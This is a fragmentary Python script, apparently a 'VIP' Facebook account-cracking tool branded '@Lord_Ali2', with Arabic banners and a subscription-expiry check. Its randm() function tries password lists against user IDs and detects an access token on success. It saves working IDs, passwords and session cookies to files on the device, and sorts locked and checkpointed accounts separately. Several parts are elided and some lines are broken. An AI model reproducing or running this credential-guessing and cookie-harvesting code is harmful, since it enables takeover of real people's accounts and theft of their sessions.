...
an2 = datetime.datetime(2024, 4, 25, 00, 0)
hours = (now.hour)
if an > an2 or an == an2:
 ...
 print('\n                             اشتراكك صالح لمدة                            ')
 print('\0331;31mالوقت حاليا : '+ str(an))
 print('\n')
 print('𓏳'*60)
 print('\033[1;31m\nوقت الانتهاء : '+ str(an2))
 print('')
 print('𓏳'*60)
 print('\t\n\033[1;31m @Lord_Ali2 الـــمـــطـــوࢪ   ')
...
try:
 ...
 print()
output = render('LORDALI', colors=['white', 'blue'], align='center')
print(output)
...
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁          
»«»«»«»«»  »««»«»«    »«  »   «««« 
✓ VIP TOOL |  @Lord_Ali2 • @FG_on
   ✓ تم تطوير من قبل اللورد علي  🔥🎭
{A}━━━━━━━━━━━━━━━━━━━━━━━━
{━━━━━━━━━━━━━━━━━━━━━━━━━
'''
...
def randm(ids,psd):
    ...
    sys.stdout.write(f'\r\r{A}[{G1}LORD-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1}LORD-OK{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/SWAG-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S}LORD-LK{A}]{S} {uid} {A}|{S} {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
    ...
    try:
        ...
        for pw in psd:
            ...
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}LORD-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/LORD-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                #print(f'\r\r{A}[{M}LORD-CP{A}]{M} {ids} {A}|{M} {pas}')
                open('/sdcard/LORD-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
